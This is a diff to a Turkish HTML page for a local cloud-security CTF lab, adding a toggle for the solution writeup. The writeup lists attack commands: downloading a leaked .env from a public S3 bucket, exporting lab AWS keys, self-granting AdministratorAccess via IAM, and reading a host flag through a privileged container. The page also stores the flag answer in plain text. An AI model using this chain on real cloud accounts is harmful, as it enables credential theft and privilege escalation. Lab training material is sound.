@@ -41,15 +41,20 @@
     .flag-input-group { display: flex; gap: 1rem; margin-top: 1rem; }
     input[type="text"] { flex: 1; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 0.75rem 1rem; color: var(--text); font-family: var(--mono); font-size: 0.95rem; transition: border-color 0.2s; }
     input[type="text"]:focus { outline: none; border-color: var(--accent); }
-    .btn-submit { background: var(--accent); color: #000; border: none; border-radius: 6px; padding: 0.75rem 1.5rem; font-family: var(--mono); font-weight: 700; cursor: pointer; transition: opacity 0.2s; }
+    
+    .btn { font-family: var(--mono); font-weight: 700; border: none; border-radius: 6px; padding: 0.75rem 1.5rem; cursor: pointer; transition: all 0.2s; }
+    .btn-submit { background: var(--accent); color: #000; }
     .btn-submit:hover { opacity: 0.9; }
     
+    .btn-toggle-writeup { background: transparent; border: 1px solid var(--accent); color: var(--accent); width: 100%; text-align: center; margin-top: 1rem; }
+    .btn-toggle-writeup:hover { background: var(--accent-dim); }
+
     #result-msg { margin-top: 1rem; font-family: var(--mono); font-size: 0.9rem; font-weight: 600; display: none; }
     .success-msg { color: var(--accent); }
     .error-msg { color: #f43f5e; }
 
     /* RIGHT: DYNAMIC WRITEUP / SOLUTION REPORT */
-    .writeup-panel { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 3rem; height: 80vh; overflow-y: auto; }
+    .writeup-panel { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 3rem; height: 80vh; overflow-y: auto; display: none; } /* Başlangıçta gizli */
     .writeup-panel h2 { font-size: 1.8rem; margin-bottom: 1.5rem; font-family: var(--mono); border-bottom: 1px solid var(--border); padding-bottom: 0.5rem; }
     .step { margin-bottom: 2.5rem; }
     .step h4 { font-family: var(--mono); color: var(--accent); margin-bottom: 0.5rem; font-size: 1.05rem; }
@@ -59,7 +64,11 @@
     pre .comment { color: #475569; }
     pre .cmd { color: #f8fafc; }
 
-    @media (max-width: 1024px) { .main-container { grid-template-columns: 1fr; } .writeup-panel { height: auto; } }
+    /* Çözüm kapalıyken sağ tarafın boş kalmaması veya şık durması için yedek alan */
+    .placeholder-panel { border: 2px dashed var(--border); border-radius: 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; p: 3rem; text-align: center; color: var(--muted); height: 80vh; }
+    .placeholder-panel span { font-size: 3rem; margin-bottom: 1rem; }
+
+    @media (max-width: 1024px) { .main-container { grid-template-columns: 1fr; } .writeup-panel, .placeholder-panel { height: auto; } .placeholder-panel { display: none; } }
   </style>
 </head>
 <body>
@@ -68,7 +77,7 @@
     <div class="nav-logo">CHALLENGE<span>//</span>CLOUD-ESCAPE</div>
     <ul class="nav-links">
       <li><a href="#arena">Lab Arenası</a></li>
-      <li><a href="#writeup">Çözüm Raporu</a></li>
+      <li><a href="#" onclick="toggleWriteup(); return false;">Çözüm Raporu</a></li>
     </ul>
   </nav>
 
@@ -85,9 +94,14 @@
         <p style="color: var(--muted); font-size: 0.9rem;">Sistem host kök dizininde yer alan <code>flag.txt</code> içeriğini buraya girin:</p>
         <div class="flag-input-group">
           <input type="text" id="flag-input" placeholder="FLAG{...}" autocomplete="off" />
-          <button class="btn-submit" onclick="validateFlag()">DOĞRULA</button>
+          <button class="btn-submit btn" onclick="validateFlag()">DOĞRULA</button>
         </div>
         <div id="result-msg"></div>
+        
+        <hr style="border: 0; border-top: 1px solid var(--border); margin: 2rem 0 1rem 0;">
+        
+        <p style="color: var(--muted); font-size: 0.85rem;">Tıkayıcı bir noktada mısınız? İlerleyemiyorsanız çözüm adımlarını açabilirsiniz:</p>
+        <button class="btn-toggle-writeup btn" id="toggle-btn" onclick="toggleWriteup()">📖 ÇÖZÜM RAPORUNU GÖSTER</button>
       </div>
 
       <div style="background: rgba(30, 41, 59, 0.3); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem;">
@@ -96,13 +110,20 @@
       </div>
     </div>
 
-    <div class="writeup-panel" id="writeup">
-      <h2>📖 Adım Adım Çözüm Raporu (Writeup)</h2>
-      
-      <div class="step">
-        <h4>Aşama 1: S3 Keşif ve Bilgi Toplama (Reconnaissance)</h4>
-        <p>Hedef LocalStack altyapısındaki açık erişimli nesne depolarını listeleyip sızan dosyaları indirin:</p>
-        <pre><span class="comment"># 1. Mevcut kovaları listele</span>
+    <div id="right-area">
+      <div class="placeholder-panel" id="placeholder">
+        <span>🔒</span>
+        <h3>Çözüm Raporu Kilitli</h3>
+        <p style="margin-top: 0.5rem; max-width: 35ch;">Önce zafiyetleri kendi tekniklerinizle sömürmeyi deneyin. Yardıma ihtiyacınız olursa raporu sol panelden açabilirsiniz.</p>
+      </div>
+
+      <div class="writeup-panel" id="writeup">
+        <h2>📖 Adım Adım Çözüm Raporu (Writeup)</h2>
+        
+        <div class="step">
+          <h4>Aşama 1: S3 Keşif ve Bilgi Toplama (Reconnaissance)</h4>
+          <p>Hedef LocalStack altyapısındaki açık erişimli nesne depolarını listeleyip sızan dosyaları indirin:</p>
+          <pre><span class="comment"># 1. Mevcut kovaları listele</span>
 aws s3 ls --endpoint-url http://localhost:4566
 
 <span class="comment"># 2. cloudsec-public-assets kovasını recursive tara</span>
@@ -110,28 +131,29 @@ aws s3 ls s3://cloudsec-public-assets/ --recursive --endpoint-url http://localho
 
 <span class="comment"># 3. Sızan hassas .env dosyasını yerel dizine indir</span>
 aws s3 cp s3://cloudsec-public-assets/config/.env . --endpoint-url http://localhost:4566</pre>
-      </div>
+        </div>
 
-      <div class="step">
-        <h4>Aşama 2: IAM Sızma ve Yetki Yükseltme (Privilege Escalation)</h4>
-        <p>Sızan .env dosyasından elde ettiğiniz kimlik anahtarlarını dışa aktarıp (export) yetki matrisinizi manipüle edin:</p>
-        <pre><span class="comment"># 1. Sızan anahtarları terminale tanımlayın</span>
+        <div class="step">
+          <h4>Aşama 2: IAM Sızma ve Yetki Yükseltme (Privilege Escalation)</h4>
+          <p>Sızan .env dosyasından elde ettiğiniz kimlik anahtarlarını dışa aktarıp (export) yetki matrisinizi manipüle edin:</p>
+          <pre><span class="comment"># 1. Sızan anahtarları terminale tanımlayın</span>
 export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7LABTEST
 export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/LABTEST+KEY
 export AWS_DEFAULT_REGION=us-east-1
 
 <span class="comment"># 2. iam:AttachUserPolicy açığını kullanarak kendinizi Admin yapın</span>
 aws iam attach-user-policy --user-name cloudsec-dev-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --endpoint-url http://localhost:4566</pre>
-      </div>
+        </div>
 
-      <div class="step">
-        <h4>Aşama 3: Konteynerden Kaçış ve Bayrağı Yakalama (Container Escape)</h4>
-        <p>Admin haklarıyla altyapıda çalışan ayrımcalıklı Docker konteynerine bağlanıp host işletim sistemine geçiş sağlayın:</p>
-        <pre><span class="comment"># 1. cloudsec-vulnerable-app konteynerinin içine interaktif kabuk (shell) açın</span>
+        <div class="step">
+          <h4>Aşama 3: Konteynerden Kaçış ve Bayrağı Yakalama (Container Escape)</h4>
+          <p>Admin haklarıyla altyapıda çalışan ayrımcalıklı Docker konteynerine bağlanıp host işletim sistemine geçiş sağlayın:</p>
+          <pre><span class="comment"># 1. cloudsec-vulnerable-app konteynerinin içine interaktif kabuk (shell) açın</span>
 docker exec -it cloudsec-vulnerable-app sh
 
 <span class="comment"># 2. Mount edilen host kök dizini üzerinden ana makinenin flag dosyasını okuyun</span>
 cat /host/root/flag.txt</pre>
+        </div>
       </div>
     </div>
 
@@ -141,8 +163,6 @@ cat /host/root/flag.txt</pre>
     function validateFlag() {
       const userInput = document.getElementById('flag-input').value.trim();
       const resultMsg = document.getElementById('result-msg');
-      
-      // XOR veya hash yerine lab için doğrudan statik kontrol (Geliştirilebilir)
       const correctFlag = "FLAG{cl0ud_esc4p3_succ3ss}";
       
       resultMsg.style.display = "block";
@@ -154,6 +174,22 @@ cat /host/root/flag.txt</pre>
         resultMsg.className = "error-msg";
         resultMsg.innerHTML = "❌ Hatalı Bayrak! Dosya yollarını ve sızma adımlarını tekrar kontrol edin.";
         document.getElementById('flag-input').style.borderColor = "#f43f5e";
+      }
+    }
+
+    function toggleWriteup() {
+      const writeup = document.getElementById('writeup');
+      const placeholder = document.getElementById('placeholder');
+      const btn = document.getElementById('toggle-btn');
+      
+      if (writeup.style.display === "none" || writeup.style.display === "") {
+        writeup.style.display = "block";
+        placeholder.style.display = "none";
+        btn.innerHTML = "🙈 ÇÖZÜM RAPORUNU GİZLE";
+      } else {
+        writeup.style.display = "none";
+        placeholder.style.display = "flex";
+        btn.innerHTML = "📖 ÇÖZÜM RAPORUNU GÖSTER";
       }
     }
   </script>
